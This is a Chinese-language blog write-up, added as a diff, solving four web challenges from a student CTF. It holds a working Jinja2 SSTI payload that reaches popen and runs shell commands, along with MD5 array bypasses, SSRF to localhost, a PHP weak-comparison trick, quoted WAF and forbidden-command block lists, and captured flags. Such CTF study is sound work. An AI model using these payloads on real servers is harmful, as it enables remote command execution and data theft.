@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="新生CTF。基本自己一个人打的（感谢图寻佬给我看了俩题）。差一个misc进前20（一直在做pwn的babyheap_revenge给我调红温了（滚回web了，我再也不学pwn了呜呜呜），没想到misc一个分这么高wok，最后来不及做了嗨） 反馈一下：大量题目是原题。。。osint把取证夺舍了。mis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届CN-fnst::CTF web部分题解">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="新生CTF。基本自己一个人打的（感谢图寻佬给我看了俩题）。差一个misc进前20（一直在做pwn的babyheap_revenge给我调红温了（滚回web了，我再也不学pwn了呜呜呜），没想到misc一个分这么高wok，最后来不及做了嗨） 反馈一下：大量题目是原题。。。osint把取证夺舍了。mis">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/15.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/16.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/17.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/18.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/19.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/20.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18607938/21.png">
+<meta property="article:published_time" content="2024-12-15T06:05:00.000Z">
+<meta property="article:modified_time" content="2024-12-15T06:05:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18607938/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>第二届CN-fnst::CTF web部分题解</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-12-22-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&text=第二届CN-fnst::CTF web部分题解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&is_video=false&description=第二届CN-fnst::CTF web部分题解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第二届CN-fnst::CTF web部分题解&body=Check out this article: https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&name=第二届CN-fnst::CTF web部分题解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&t=第二届CN-fnst::CTF web部分题解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">1.1.</span> <span class="toc-text">ez_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-number">1.2.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#comment-me"><span class="toc-number">1.3.</span> <span class="toc-text">comment_me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i-am-eeeeeshili"><span class="toc-number">1.4.</span> <span class="toc-text">i_am_eeeeeshili</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        第二届CN-fnst::CTF web部分题解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-15T06:05:00.000Z" class="dt-published" itemprop="datePublished">2024-12-15</time>
+        
+        (Updated: <time datetime="2024-12-15T06:05:00.000Z" class="dt-updated" itemprop="dateModified">2024-12-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>新生CTF。基本自己一个人打的（感谢图寻佬给我看了俩题）。差一个misc进前20（一直在做pwn的babyheap_revenge给我调红温了（滚回web了，我再也不学pwn了呜呜呜），没想到misc一个分这么高wok，最后来不及做了嗨）</p>
+<p>反馈一下：大量题目是原题。。。osint把取证夺舍了。misc把cry夺舍了（真密码题都不难，唯一一个还是强网青少组的原题 数据都没改）。PWN全是原题（泷羽杯的）。re，web，misc算正常。出题风格上偏脑洞。</p>
+<p>对于web来说，比较简单。基本都是黑盒题，有一个附件没上（后来上了我没看到wok，所以不写这题wp了（懒懒懒））flag文件都是空的（全在env里？？？）就导致很多题读flag没回显，还以为要提权。</p>
+<p>有官方wp。鉴于我跟别人说要周更博客（bushi）还是写一个吧。理论上还是web手，所以就写点web。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>三个签到，eshili那题有个用户不走waf，伪造就好。math那个题脚本跑烂了没flag。filechecker_revenge你们看官p吧。没看到后来的附件，大概看了一下好像是phar反序列化。</p>
+<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p><img src="/images/migrated/18607938/01.png"><br>get fuzz，甚至不需要工具。手fuzz就能出file参数<br><img src="/images/migrated/18607938/02.png"><br>读不到&#x2F;flag。读app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line">from flask_limiter import Limiter</span><br><span class="line">from flask_limiter.util import get_remote_address</span><br><span class="line">import waf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(get_remote_address, app=app, default_limits=[&quot;300 per day&quot;, &quot;75 per hour&quot;])</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">@limiter.exempt</span><br><span class="line">def index():</span><br><span class="line">    file_path = request.args.get(&#x27;file&#x27;)</span><br><span class="line">    if file_path and &quot;proc&quot; in file_path:</span><br><span class="line">        return &quot;只过滤了proc，别想用这个了，去读源码&quot;, 200</span><br><span class="line">    if file_path:</span><br><span class="line">        try:</span><br><span class="line">            with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">            return f&quot;&#123;file_content&#125;&quot;</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&quot;Error reading file: &#123;e&#125;&quot;</span><br><span class="line">    return &quot;Find the get parameter to read something&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shell&#x27;)</span><br><span class="line">@limiter.limit(&quot;10 per minute&quot;)</span><br><span class="line">def shell():</span><br><span class="line">    if request.args.get(&#x27;name&#x27;):</span><br><span class="line">        person = request.args.get(&#x27;name&#x27;)</span><br><span class="line">        if not waf.waf_check(person):</span><br><span class="line">            mistake = &quot;Something is banned&quot;</span><br><span class="line">            return mistake</span><br><span class="line">    template = &#x27;Hi, %s&#x27; % person</span><br><span class="line">    return render_template_string(template)</span><br><span class="line">some = &#x27;who you are?&#x27;</span><br><span class="line">return render_template_string(some)</span><br><span class="line"></span><br><span class="line">@app.errorhandler(429)</span><br><span class="line">def ratelimit_error(e):</span><br><span class="line">    return &quot;工具？ 毫无意义，去手搓&quot;, 429</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=False, host=&#x27;0.0.0.0&#x27;, port=8000)</span><br></pre></td></tr></table></figure>
+
+<p>发现有import waf，读waf.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def waf_check(value):</span><br><span class="line">    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]</span><br><span class="line">    for pattern in dangerous_patterns:</span><br><span class="line">        if pattern in value:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure>
+
+<p>限制了频次不让用fenjing。欸我就偏要用fenjing喵（（（本地起一个服务直接fenjing抛出payload原封不动搬过去就行（（（</p>
+<p>这个SSTI过滤约等于没有（绕过方式比我分多）。挑个最简单的request逃逸出了（懒）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shell?name=&#123;%25%20print(&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;a&#x27;]][request[&#x27;args&#x27;][&#x27;b&#x27;]][request[&#x27;args&#x27;][&#x27;c&#x27;]]()[132][request[&#x27;args&#x27;][&#x27;d&#x27;]][request[&#x27;args&#x27;][&#x27;f&#x27;]][request[&#x27;args&#x27;][&#x27;e&#x27;]](&#x27;whoami&#x27;)[&#x27;read&#x27;]())%20%25&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__init__&amp;e=popen&amp;f=__globals__</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18607938/03.png"></p>
+<p><code>ls</code>找flag文件</p>
+<p><img src="/images/migrated/18607938/04.png"></p>
+<p><code>cat f1ag_H3re11</code>出</p>
+<p><img src="/images/migrated/18607938/05.png"></p>
+<p><strong>flag{0241c8ed-8c99-4ca2-a0b6-54964b569049}</strong></p>
+<p>合格的签到题。</p>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>新生题。甚至flag在env里。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;usn&#x27;]) &amp;&amp; isset($_POST[&#x27;pwd&#x27;]) &amp;&amp; isset($_GET[&#x27;usn1&#x27;]) &amp;&amp; isset($_POST[&#x27;pwd1&#x27;]) )&#123;</span><br><span class="line">    $usn = $_GET[&#x27;usn&#x27;];</span><br><span class="line">    $usn1 = $_GET[&#x27;usn1&#x27;];</span><br><span class="line">    $pwd = $_POST[&#x27;pwd&#x27;];</span><br><span class="line">    $pwd1 = $_POST[&#x27;pwd1&#x27;];</span><br><span class="line">    if ($usn != $pwd &amp;&amp; md5($usn) == md5($pwd))&#123;</span><br><span class="line">        if ($usn1 !== $pwd1 &amp;&amp; md5($usn1) === md5($pwd1))&#123;</span><br><span class="line">            $sign = isset($_GET[&#x27;sign&#x27;]) &amp;&amp; !empty($_GET[&#x27;sign&#x27;]) ? $_GET[&#x27;sign&#x27;] : &#x27;&#x27;;</span><br><span class="line">            $forbidden_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;head&#x27;, &#x27;tail&#x27;, &#x27;read&#x27;];</span><br><span class="line">            $sign_lower = strtolower($sign);</span><br><span class="line">            foreach ($forbidden_commands as $forbidden) &#123;</span><br><span class="line">                if (strpos($sign_lower, $forbidden) !== false) &#123;</span><br><span class="line">                    die(&#x27;lol&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (empty($sign)) &#123;</span><br><span class="line">                die(&#x27;lol&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                $output = shell_exec(escapeshellcmd($sign));</span><br><span class="line">                echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125; catch (ValueError $e) &#123;</span><br><span class="line">                echo &quot;lol&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;lol&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;lol&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &#x27;lol&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>usn和pwd那俩一看就是数组绕。后面一个RCE。</p>
+<p><img src="/images/migrated/18607938/06.png"></p>
+<p><strong>flag{a2059a27-c817-4b9a-96d6-c3faef3c2d2a}</strong></p>
+<p>这里跟新生说一句：这里如果真要读文件也是绕过的方法比我分多。nl, sort啥的都可以。</p>
+<h2 id="comment-me"><a href="#comment-me" class="headerlink" title="comment_me"></a>comment_me</h2><p>依然是签到难度。WEB题虽然说唐了点，但还是很照顾新生的。就是这里SSTI考点重复了。而且过滤更少了。。。</p>
+<p><img src="/images/migrated/18607938/07.png"></p>
+<p>找到&#x2F;modify。post发个包看看。</p>
+<p><img src="/images/migrated/18607938/08.png"></p>
+<p>回到主页</p>
+<p><img src="/images/migrated/18607938/09.png"></p>
+<p>fuzz，发现只过滤了点号。。。剩下的不解释了喵。直接快进到难题吧（flag在env里不在同目录文件里，你没读出来不是你的问题）</p>
+<p><img src="/images/migrated/18607938/10.png"></p>
+<p>出flag</p>
+<p><img src="/images/migrated/18607938/11.png"></p>
+<p><strong>flag{aeab73b2-5abf-4f5d-a223-84fbb72ad401}</strong></p>
+<h2 id="i-am-eeeeeshili"><a href="#i-am-eeeeeshili" class="headerlink" title="i_am_eeeeeshili"></a>i_am_eeeeeshili</h2><p>估计前几道题也没几个人看。欸我说你是直接点到这题来的吧（（（是吧是吧</p>
+<p>注册登录，看cookie（底下的base64有fake flag）</p>
+<p><img src="/images/migrated/18607938/12.png"></p>
+<p>发现有admin账号和eeeeeshili账号（这里有点脑洞）（注册不了）。</p>
+<p>这个qwer很可疑。删掉之后就会直接未认证回到登陆界面。在这里充当密钥的角色。而且每一次登录账号qwer还不一样。</p>
+<p>登录，抓包。看到：</p>
+<p><img src="/images/migrated/18607938/13.png"></p>
+<p>修改file，看到出题人的waf提示（人还怪好的，没得喷）</p>
+<p><img src="/images/migrated/18607938/14.png"></p>
+<p>读取&#x2F;flag</p>
+<p><img src="/images/migrated/18607938/15.png"></p>
+<p>看到</p>
+<p><img src="/images/migrated/18607938/16.png"></p>
+<p>需要一个包含的洞（str_replace了__FILE__中路径穿越可能用到的字符之后不能与当前脚本名相等）想到SSRF</p>
+<p>抓包。看到setsession.php。POST参数为message。GET stream看到回显。</p>
+<p>综上。尝试打ssrf</p>
+<p><img src="/images/migrated/18607938/17.png"></p>
+<p>居然一点过滤都没有我勒个</p>
+<p><img src="/images/migrated/18607938/18.png"></p>
+<p>修改eeeeeshili账号密码。（试过修改admin账号的密码。发现登进去是一样的）</p>
+<p><img src="/images/migrated/18607938/19.png"></p>
+<p>base64解码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$client_ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$server_ip = $_SERVER[&quot;SERVER_ADDR&quot;];</span><br><span class="line">if ($client_ip === $server_ip) &#123;</span><br><span class="line">    if ($_GET[&quot;KAF&quot;] !== &quot;1a&quot; &amp;&amp; (int)$_GET[&quot;KAF&quot;] == &quot;1a&quot;)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;xxx&#x27;</span><br><span class="line">    echo &#x27;&lt;script&gt;alert(&quot;坏蛋改不了一点密码！&quot;);&lt;/script&gt;&#x27;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弱类型比较。KAF&#x3D;1即可。</p>
+<p><img src="/images/migrated/18607938/20.png"></p>
+<p>php特性打就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check_http://127.0.0.1/check.php?file=./flag&amp;a[]=1&amp;b[]=2&amp;c[]=1&amp;d[]=2&amp;e=2000864773</span><br></pre></td></tr></table></figure>
+
+<p>小声ps：整个比赛的MD5绕过貌似都可以用数组绕，下次检查一下类型啊喂</p>
+<p><img src="/images/migrated/18607938/21.png"></p>
+<p>加QQ要flag</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-python"><span class="toc-number">1.1.</span> <span class="toc-text">ez_python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-number">1.2.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#comment-me"><span class="toc-number">1.3.</span> <span class="toc-text">comment_me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i-am-eeeeeshili"><span class="toc-number">1.4.</span> <span class="toc-text">i_am_eeeeeshili</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&text=第二届CN-fnst::CTF web部分题解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&is_video=false&description=第二届CN-fnst::CTF web部分题解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第二届CN-fnst::CTF web部分题解&body=Check out this article: https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&title=第二届CN-fnst::CTF web部分题解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&name=第二届CN-fnst::CTF web部分题解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-12-15-cn-fnstctf-web/&t=第二届CN-fnst::CTF web部分题解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
